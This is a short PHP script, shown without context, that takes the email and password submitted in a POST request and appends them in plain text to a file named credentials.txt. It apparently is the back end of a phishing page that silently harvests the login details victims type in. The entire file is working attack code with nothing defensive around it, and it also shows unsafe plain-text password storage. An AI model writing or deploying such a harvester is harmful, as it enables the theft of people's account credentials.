<?php
$email = $_POST['email'];
$password = $_POST['password'];
$log = "Email: " . $email . ", Password: " . $password . "\n";
file_put_contents('credentials.txt', $log, FILE_APPEND);
?>
